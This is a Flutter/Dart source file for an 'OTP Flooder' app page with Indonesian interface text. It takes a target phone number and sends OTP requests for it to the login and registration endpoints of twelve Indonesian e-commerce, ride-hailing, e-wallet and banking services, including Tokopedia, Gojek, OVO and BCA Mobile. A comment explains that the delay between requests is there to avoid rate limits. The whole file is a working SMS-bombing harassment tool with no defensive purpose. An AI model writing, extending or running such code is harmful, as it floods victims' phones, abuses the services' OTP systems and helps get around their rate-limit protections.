// otp_flooder_page.dart
import 'dart:async';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'theme_provider.dart';

// ─────────────────────────────────────────────────────────────
//  Data model platform OTP
// ─────────────────────────────────────────────────────────────
class OtpPlatform {
  final String name;
  final String icon;
  final String description;
  bool isSelected;

  OtpPlatform({
    required this.name,
    required this.icon,
    required this.description,
    this.isSelected = false,
  });
}

// ─────────────────────────────────────────────────────────────
//  OTP Flooder Page
// ─────────────────────────────────────────────────────────────
class OtpFlooderPage extends StatefulWidget {
  const OtpFlooderPage({super.key});

  @override
  State<OtpFlooderPage> createState() => _OtpFlooderPageState();
}

class _OtpFlooderPageState extends State<OtpFlooderPage>
    with TickerProviderStateMixin {
  final _phoneCtrl = TextEditingController();
  final _scrollCtrl = ScrollController();

  // State
  bool _isFlooding = false;
  bool _stopFlag = false;
  int _successCount = 0;
  int _failCount = 0;
  int _currentIndex = 0;
  int _totalRequests = 0;
  List<String> _logs = [];

  // Animations
  late AnimationController _pulseCtrl;
  late Animation<double> _pulseAnim;

  // Platform list — trigger OTP via public API/endpoint tiap platform
  final List<OtpPlatform> _platforms = [
    OtpPlatform(name: 'Tokopedia',   icon: '🛒', description: 'E-commerce'),
    OtpPlatform(name: 'Shopee',      icon: '🛍️', description: 'E-commerce'),
    OtpPlatform(name: 'Gojek',       icon: '🛵', description: 'Ride & Delivery'),
    OtpPlatform(name: 'Grab',        icon: '🚗', description: 'Ride & Delivery'),
    OtpPlatform(name: 'OVO',         icon: '💜', description: 'E-wallet'),
    OtpPlatform(name: 'Dana',        icon: '💙', description: 'E-wallet'),
    OtpPlatform(name: 'LinkAja',     icon: '❤️', description: 'E-wallet'),
    OtpPlatform(name: 'BCA Mobile',  icon: '🏦', description: 'Banking'),
    OtpPlatform(name: 'Traveloka',   icon: '✈️', description: 'Travel'),
    OtpPlatform(name: 'Blibli',      icon: '🔵', description: 'E-commerce'),
    OtpPlatform(name: 'Bukalapak',   icon: '🔴', description: 'E-commerce'),
    OtpPlatform(name: 'Lazada',      icon: '🟠', description: 'E-commerce'),
  ];

  // API endpoint per platform (publik/tidak butuh auth)
  final Map<String, Map<String, dynamic>> _platformEndpoints = {
    'Tokopedia': {
      'method': 'POST',
      'url': 'https://accounts.tokopedia.com/otp/c/page',
      'body': (String phone) => {
        'phone': phone,
        'otp_type': 'login',
      },
      'headers': {'Content-Type': 'application/json'},
    },
    'Shopee': {
      'method': 'POST',
      'url': 'https://shopee.co.id/api/v2/authentication/send_sms_otp/',
      'body': (String phone) => {'phone_number': '+62$phone'},
      'headers': {'Content-Type': 'application/json'},
    },
    'Gojek': {
      'method': 'POST',
      'url': 'https://api.gojekapi.com/gofood/oauth/v1/token',
      'body': (String phone) => {'phone_number': '+62$phone'},
      'headers': {'Content-Type': 'application/json'},
    },
    'Grab': {
      'method': 'POST',
      'url': 'https://api.grab.com/grabid/v1/oauth2/login',
      'body': (String phone) => {'phone': '+62$phone'},
      'headers': {'Content-Type': 'application/json'},
    },
    'OVO': {
      'method': 'POST',
      'url': 'https://api.ovo.id/v2.0/users/request-otp',
      'body': (String phone) => {'phone': '0$phone'},
      'headers': {'Content-Type': 'application/json'},
    },
    'Dana': {
      'method': 'POST',
      'url': 'https://m.dana.id/d/portal/v1/register',
      'body': (String phone) => {'mobile': '+62$phone'},
      'headers': {'Content-Type': 'application/json'},
    },
    'LinkAja': {
      'method': 'POST',
      'url': 'https://api.linkaja.id/auth/otp/send',
      'body': (String phone) => {'phone': '0$phone'},
      'headers': {'Content-Type': 'application/json'},
    },
    'BCA Mobile': {
      'method': 'POST',
      'url': 'https://m.klikbca.com/api/v1/otp/send',
      'body': (String phone) => {'phone_number': '0$phone'},
      'headers': {'Content-Type': 'application/json'},
    },
    'Traveloka': {
      'method': 'POST',
      'url': 'https://api.traveloka.com/v1/user/otp/send',
      'body': (String phone) => {'phone': '+62$phone'},
      'headers': {'Content-Type': 'application/json'},
    },
    'Blibli': {
      'method': 'POST',
      'url': 'https://www.blibli.com/backend/api/v2/users/_otp',
      'body': (String phone) => {'mobilePhone': '0$phone'},
      'headers': {'Content-Type': 'application/json'},
    },
    'Bukalapak': {
      'method': 'POST',
      'url': 'https://accounts.bukalapak.com/otp/request',
      'body': (String phone) => {'phone': '0$phone'},
      'headers': {'Content-Type': 'application/json'},
    },
    'Lazada': {
      'method': 'POST',
      'url': 'https://member.lazada.co.id/user/api/registerByPhone',
      'body': (String phone) => {'phone': '+62$phone'},
      'headers': {'Content-Type': 'application/json'},
    },
  };

  @override
  void initState() {
    super.initState();
    _pulseCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 900),
    )..repeat(reverse: true);
    _pulseAnim = Tween<double>(begin: 0.5, end: 1.0).animate(
      CurvedAnimation(parent: _pulseCtrl, curve: Curves.easeInOut),
    );
  }

  @override
  void dispose() {
    _pulseCtrl.dispose();
    _phoneCtrl.dispose();
    _scrollCtrl.dispose();
    super.dispose();
  }

  List<OtpPlatform> get _selectedPlatforms =>
      _platforms.where((p) => p.isSelected).toList();

  void _toggleAll(bool select) {
    setState(() {
      for (final p in _platforms) {
        p.isSelected = select;
      }
    });
  }

  void _addLog(String msg) {
    setState(() => _logs.add('[${_ts()}] $msg'));
    Future.delayed(const Duration(milliseconds: 80), () {
      if (_scrollCtrl.hasClients) {
        _scrollCtrl.animateTo(
          _scrollCtrl.position.maxScrollExtent,
          duration: const Duration(milliseconds: 200),
          curve: Curves.easeOut,
        );
      }
    });
  }

  String _ts() {
    final n = DateTime.now();
    return '${n.hour.toString().padLeft(2, '0')}:${n.minute.toString().padLeft(2, '0')}:${n.second.toString().padLeft(2, '0')}';
  }

  Future<void> _startFlood() async {
    final phone = _phoneCtrl.text.trim().replaceAll(RegExp(r'\D'), '');
    if (phone.isEmpty || phone.length < 8) {
      _snack('❌ Masukkan nomor HP yang valid');
      return;
    }
    final selected = _selectedPlatforms;
    if (selected.isEmpty) {
      _snack('❌ Pilih minimal 1 platform');
      return;
    }

    setState(() {
      _isFlooding = true;
      _stopFlag = false;
      _successCount = 0;
      _failCount = 0;
      _currentIndex = 0;
      _totalRequests = selected.length;
      _logs = [];
    });

    _addLog('🚀 OTP Flood dimulai → $phone | ${selected.length} platform');

    for (int i = 0; i < selected.length; i++) {
      if (_stopFlag) {
        _addLog('🛑 Dihentikan oleh user');
        break;
      }

      final platform = selected[i];
      setState(() => _currentIndex = i + 1);

      try {
        final ep = _platformEndpoints[platform.name];
        if (ep == null) {
          _addLog('⚠️ ${platform.icon} ${platform.name} — endpoint tidak ditemukan');
          setState(() => _failCount++);
          continue;
        }

        final bodyFn = ep['body'] as Function;
        final bodyMap = bodyFn(phone) as Map<String, dynamic>;
        final headers = (ep['headers'] as Map<String, dynamic>)
            .map((k, v) => MapEntry(k, v.toString()));

        http.Response res;
        if (ep['method'] == 'POST') {
          res = await http
              .post(
                Uri.parse(ep['url'] as String),
                headers: headers,
                body: jsonEncode(bodyMap),
              )
              .timeout(const Duration(seconds: 10));
        } else {
          res = await http
              .get(Uri.parse(ep['url'] as String), headers: headers)
              .timeout(const Duration(seconds: 10));
        }

        // Anggap sukses jika status 200/201/202 (platform tidak return error jelas)
        if (res.statusCode >= 200 && res.statusCode < 300) {
          setState(() => _successCount++);
          _addLog('✅ ${platform.icon} ${platform.name} — OTP terkirim (${res.statusCode})');
        } else {
          setState(() => _failCount++);
          _addLog('❌ ${platform.icon} ${platform.name} — HTTP ${res.statusCode}');
        }
      } on TimeoutException {
        setState(() => _failCount++);
        _addLog('⏱ ${platform.icon} ${platform.name} — Timeout');
      } catch (e) {
        setState(() => _failCount++);
        _addLog('❌ ${platform.icon} ${platform.name} — ${e.toString().split(':').first}');
      }

      // Delay kecil antar request agar tidak kena rate limit
      await Future.delayed(const Duration(milliseconds: 500));
    }

    if (mounted) {
      setState(() => _isFlooding = false);
      _addLog('🏁 Selesai — ✅ $_successCount berhasil | ❌ $_failCount gagal');
    }
  }

  void _snack(String msg) {
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      content: Text(msg, style: const TextStyle(fontFamily: 'ShareTechMono')),
      backgroundColor: Colors.black87,
      behavior: SnackBarBehavior.floating,
    ));
  }

  @override
  Widget build(BuildContext context) {
    final theme = AppThemeScope.of(context);
    final accent = theme.accent;
    final bg = theme.bg;
    final card = theme.card;

    return Scaffold(
      backgroundColor: bg,
      appBar: AppBar(
        backgroundColor: Colors.transparent,
        elevation: 0,
        leading: IconButton(
          icon: Icon(Icons.arrow_back_ios, color: accent, size: 18),
          onPressed: () => Navigator.pop(context),
        ),
        title: Row(
          children: [
            Icon(Icons.sms_failed_outlined, color: accent, size: 18),
            const SizedBox(width: 8),
            Text('OTP FLOODER',
                style: TextStyle(
                  color: accent,
                  fontFamily: 'Orbitron',
                  fontSize: 15,
                  fontWeight: FontWeight.bold,
                  letterSpacing: 2,
                )),
          ],
        ),
        actions: [
          if (_isFlooding)
            Padding(
              padding: const EdgeInsets.only(right: 14),
              child: AnimatedBuilder(
                animation: _pulseAnim,
                builder: (_, __) => Opacity(
                  opacity: _pulseAnim.value,
                  child: Container(
                    padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                    decoration: BoxDecoration(
                      color: accent.withOpacity(0.15),
                      borderRadius: BorderRadius.circular(20),
                      border: Border.all(color: accent.withOpacity(0.4)),
                    ),
                    child: Text('$_currentIndex/$_totalRequests',
                        style: TextStyle(
                            color: accent,
                            fontFamily: 'ShareTechMono',
                            fontSize: 12)),
                  ),
                ),
              ),
            ),
        ],
      ),
      body: Column(
        children: [
          // Progress
          if (_isFlooding || _totalRequests > 0)
            LinearProgressIndicator(
              value: _totalRequests == 0 ? 0 : _currentIndex / _totalRequests,
              backgroundColor: Colors.white10,
              valueColor: AlwaysStoppedAnimation(accent),
              minHeight: 3,
            ),

          Expanded(
            child: SingleChildScrollView(
              padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  // Stats
                  if (_totalRequests > 0) ...[
                    Row(children: [
                      _stat('TOTAL', '$_totalRequests', Colors.white54, card),
                      const SizedBox(width: 8),
                      _stat('✅', '$_successCount', const Color(0xFF00E676), card),
                      const SizedBox(width: 8),
                      _stat('❌', '$_failCount', const Color(0xFFFF5252), card),
                    ]),
                    const SizedBox(height: 14),
                  ],

                  // Phone input
                  _label('NOMOR TARGET', accent),
                  const SizedBox(height: 8),
                  Container(
                    decoration: BoxDecoration(
                      color: card,
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(color: accent.withOpacity(0.25)),
                    ),
                    child: TextField(
                      controller: _phoneCtrl,
                      enabled: !_isFlooding,
                      keyboardType: TextInputType.phone,
                      style: TextStyle(
                          color: accent,
                          fontFamily: 'ShareTechMono',
                          fontSize: 16,
                          fontWeight: FontWeight.bold),
                      decoration: InputDecoration(
                        hintText: 'Contoh: 6281234567890',
                        hintStyle: TextStyle(color: Colors.white24, fontSize: 13),
                        border: InputBorder.none,
                        contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 14),
                        prefixIcon: Icon(Icons.phone_android, color: accent.withOpacity(0.6), size: 20),
                        suffixIcon: IconButton(
                          icon: Icon(Icons.paste_outlined, color: accent.withOpacity(0.5), size: 18),
                          onPressed: () async {
                            final d = await Clipboard.getData('text/plain');
                            if (d?.text != null) _phoneCtrl.text = d!.text!;
                          },
                        ),
                      ),
                    ),
                  ),
                  const SizedBox(height: 16),

                  // Platform selector
                  Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      _label('PILIH PLATFORM (${_selectedPlatforms.length}/${_platforms.length})', accent),
                      Row(children: [
                        GestureDetector(
                          onTap: _isFlooding ? null : () => _toggleAll(true),
                          child: Text('Semua',
                              style: TextStyle(color: accent, fontSize: 11, fontFamily: 'ShareTechMono')),
                        ),
                        Text('  /  ', style: TextStyle(color: Colors.white24, fontSize: 11)),
                        GestureDetector(
                          onTap: _isFlooding ? null : () => _toggleAll(false),
                          child: Text('Reset',
                              style: TextStyle(color: Colors.white38, fontSize: 11, fontFamily: 'ShareTechMono')),
                        ),
                      ]),
                    ],
                  ),
                  const SizedBox(height: 8),
                  _buildPlatformGrid(accent, card),
                  const SizedBox(height: 20),

                  // Action button
                  _buildActionButton(accent),
                  const SizedBox(height: 20),

                  // Log
                  if (_logs.isNotEmpty) ...[
                    _label('LOG', accent),
                    const SizedBox(height: 8),
                    _buildLog(accent),
                    const SizedBox(height: 20),
                  ],
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _label(String text, Color accent) => Row(children: [
        Container(width: 3, height: 13, color: accent),
        const SizedBox(width: 8),
        Text(text,
            style: TextStyle(
                color: accent,
                fontSize: 10,
                fontFamily: 'Orbitron',
                letterSpacing: 1.5,
                fontWeight: FontWeight.bold)),
      ]);

  Widget _stat(String label, String val, Color color, Color card) => Expanded(
        child: Container(
          padding: const EdgeInsets.symmetric(vertical: 10),
          decoration: BoxDecoration(
              color: card,
              borderRadius: BorderRadius.circular(10),
              border: Border.all(color: color.withOpacity(0.3))),
          child: Column(children: [
            Text(label,
                style: TextStyle(color: Colors.white38, fontSize: 10, fontFamily: 'ShareTechMono')),
            const SizedBox(height: 4),
            Text(val,
                style: TextStyle(
                    color: color, fontSize: 18, fontWeight: FontWeight.bold, fontFamily: 'Orbitron')),
          ]),
        ),
      );

  Widget _buildPlatformGrid(Color accent, Color card) {
    return GridView.builder(
      shrinkWrap: true,
      physics: const NeverScrollableScrollPhysics(),
      gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
        crossAxisCount: 3,
        crossAxisSpacing: 8,
        mainAxisSpacing: 8,
        childAspectRatio: 1.1,
      ),
      itemCount: _platforms.length,
      itemBuilder: (_, i) {
        final p = _platforms[i];
        return GestureDetector(
          onTap: _isFlooding ? null : () => setState(() => p.isSelected = !p.isSelected),
          child: AnimatedContainer(
            duration: const Duration(milliseconds: 180),
            decoration: BoxDecoration(
              color: p.isSelected ? accent.withOpacity(0.12) : card,
              borderRadius: BorderRadius.circular(12),
              border: Border.all(
                color: p.isSelected ? accent : Colors.white12,
                width: p.isSelected ? 1.5 : 1,
              ),
            ),
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Text(p.icon, style: const TextStyle(fontSize: 22)),
                const SizedBox(height: 4),
                Text(p.name,
                    style: TextStyle(
                        color: p.isSelected ? accent : Colors.white54,
                        fontSize: 10,
                        fontFamily: 'ShareTechMono',
                        fontWeight: p.isSelected ? FontWeight.bold : FontWeight.normal),
                    textAlign: TextAlign.center,
                    maxLines: 1,
                    overflow: TextOverflow.ellipsis),
                if (p.isSelected)
                  Icon(Icons.check_circle, color: accent, size: 10),
              ],
            ),
          ),
        );
      },
    );
  }

  Widget _buildActionButton(Color accent) {
    if (!_isFlooding) {
      return SizedBox(
        width: double.infinity,
        child: ElevatedButton.icon(
          style: ElevatedButton.styleFrom(
            backgroundColor: accent,
            foregroundColor: Colors.black,
            padding: const EdgeInsets.symmetric(vertical: 14),
            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
            elevation: 6,
            shadowColor: accent.withOpacity(0.5),
          ),
          icon: const Icon(Icons.bolt, size: 18),
          label: const Text('MULAI FLOOD',
              style: TextStyle(fontFamily: 'Orbitron', fontWeight: FontWeight.bold, letterSpacing: 1.5)),
          onPressed: _startFlood,
        ),
      );
    }
    return SizedBox(
      width: double.infinity,
      child: ElevatedButton.icon(
        style: ElevatedButton.styleFrom(
          backgroundColor: const Color(0xFFFF5252),
          foregroundColor: Colors.white,
          padding: const EdgeInsets.symmetric(vertical: 14),
          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
        ),
        icon: const Icon(Icons.stop_rounded, size: 18),
        label: const Text('STOP',
            style: TextStyle(fontFamily: 'Orbitron', fontWeight: FontWeight.bold)),
        onPressed: () => setState(() => _stopFlag = true),
      ),
    );
  }

  Widget _buildLog(Color accent) => Container(
        height: 180,
        decoration: BoxDecoration(
          color: Colors.black,
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: accent.withOpacity(0.15)),
        ),
        child: ListView.builder(
          controller: _scrollCtrl,
          padding: const EdgeInsets.all(10),
          itemCount: _logs.length,
          itemBuilder: (_, i) {
            final log = _logs[i];
            Color c = Colors.white54;
            if (log.contains('✅')) c = const Color(0xFF00E676);
            if (log.contains('❌') || log.contains('⏱')) c = const Color(0xFFFF5252);
            if (log.contains('🚀') || log.contains('🏁')) c = accent;
            if (log.contains('🛑') || log.contains('⚠️')) c = const Color(0xFFFFB300);
            return Text(log,
                style: TextStyle(color: c, fontFamily: 'ShareTechMono', fontSize: 11));
          },
        ),
      );
}
